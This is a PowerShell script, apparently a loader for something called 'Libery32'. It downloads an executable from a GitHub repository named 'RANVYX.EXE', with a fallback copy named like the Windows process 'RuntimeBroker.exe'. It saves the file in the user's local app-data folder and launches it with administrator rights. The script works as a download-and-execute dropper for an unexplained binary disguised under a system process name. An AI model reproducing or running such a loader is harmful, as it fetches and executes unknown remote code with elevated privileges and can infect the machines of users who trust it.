# Libery32 - download exe then run
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$dir  = Join-Path $env:LOCALAPPDATA 'Libery32'
$exe  = Join-Path $dir 'Libery32.exe'
$tmp  = Join-Path $dir 'Libery32.download'
$urls = @(
    'https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/Libery32.exe',
    'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.exe',
    'https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/RuntimeBroker.exe',
    'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RuntimeBroker.exe'
)
$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Libery32/1.2'

function Is-Exe([string]$p) {
    if (-not (Test-Path -LiteralPath $p)) { return $false }
    try {
        $i = Get-Item -LiteralPath $p
        if ($i.Length -lt 500KB) { return $false }
        $b = New-Object byte[] 2
        $fs = [IO.File]::OpenRead($p)
        try { [void]$fs.Read($b, 0, 2) } finally { $fs.Dispose() }
        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
    } catch { return $false }
}

try {
    if (-not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
    if (-not (Is-Exe $exe)) {
        Write-Host 'Downloading ...' -ForegroundColor Cyan
        $ok = $false
        foreach ($url in $urls) {
            for ($n = 1; $n -le 4; $n++) {
                try {
                    if (Test-Path -LiteralPath $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
                    Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -Headers @{ 'User-Agent' = $ua } -TimeoutSec 180
                    if (Is-Exe $tmp) { Move-Item $tmp $exe -Force; $ok = $true; break }
                } catch { Start-Sleep -Seconds (3 * $n) }
            }
            if ($ok) { break }
        }
        if (-not $ok) { throw 'Cannot download exe from GitHub' }
        Write-Host "Downloaded: $exe" -ForegroundColor Green
    } else {
        Write-Host "Using cache: $exe" -ForegroundColor Green
    }
    Write-Host 'Starting as Administrator...' -ForegroundColor Cyan
    $p = Start-Process -FilePath $exe -Verb RunAs -PassThru
    if ($null -eq $p) { throw 'UAC cancelled' }
    Start-Sleep -Seconds 2
    if ($p.HasExited) { throw "Exe closed (exit $($p.ExitCode))" }
    Write-Host 'Libery32 is running.' -ForegroundColor Green
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
Write-Host ''; Read-Host 'Press Enter to close'
